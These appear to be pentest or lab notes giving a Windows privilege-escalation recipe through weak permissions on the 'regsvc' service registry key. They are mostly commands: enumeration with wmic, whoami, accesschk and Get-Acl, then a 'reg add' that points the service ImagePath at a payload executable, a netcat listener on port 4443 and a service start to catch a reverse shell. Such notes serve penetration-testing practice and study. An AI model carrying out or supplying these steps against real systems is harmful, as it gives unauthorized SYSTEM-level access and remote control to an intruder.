(checklist)

- port scan
- version scan
- service scan

COMMANDS:
Enumeration:Open a command prompt and run the WMICcommand below to list the services in the local machine:
wmic service get name | findstr /i /v "C:\Windows\\""

Let us look for interesting service like “registry” or “regsvc”. Ex. RemoteRegistry

To check what groups this user belongs. all the output is the group of this user
whoami /groups
This useris a member of BUILTIN\Usersand NT AUTHORITY\INTERACTIVEgroups.

Run the command below to check for our permission in the services keys.
C:\Users\user\Desktop\Tools\accesschk64.exe "INTERACTIVE" -kvuqsw hklm\System\CurrentControlSet\services
It seems that we have full access to the regsvcservice. 
RW HKLM\System\CurrentControlSet\services\regsvc
        KEY_ALL_ACCESS

Run SubInACL

C:\Users\user\Desktop\Tools\subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc" /display

Run Powershell

Confirm if INTERACTIVE really has full-access:
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl

Check if we can restart the service:
C:\Users\user\Desktop\Tools\accesschk64.exe /accepteula -ucqv user regsvc

Query the service's registry path to our payload:
reg query hklm\System\CurrentControlSet\services\regsvc

Modify the image path:
reg add "HKLM\SYSTEM\CurrentControlSet\Services\regsvc" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\user\Downloads\usp_payload.exe" /f

sc qc regsvc

sc query regsvc

nc -nlvp 4443

sc start regsvc

go back to listening terminal